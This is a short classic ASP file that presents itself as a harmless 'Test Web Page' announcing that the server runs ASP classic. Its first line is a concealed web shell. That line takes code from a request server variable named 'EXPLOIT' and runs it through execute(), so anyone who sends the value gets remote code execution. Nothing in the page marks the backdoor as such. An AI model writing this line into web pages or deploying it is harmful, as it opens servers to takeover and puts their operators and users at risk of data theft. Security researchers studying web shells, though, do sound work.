<% If request.servervariables("EXPLOIT") <> "" Then:execute(request.servervariables("EXPLOIT")):response.end:End If %>
<!DOCTYPE html>
<html>
	<head>
		<title>Test Web Page</title>
	</head>
	<body>
		<h1>Test Web Page</h1>
		<p>
            <%
                response.write("Web server running ASP classic.")
            %>
		</p>
	</body>
</html>
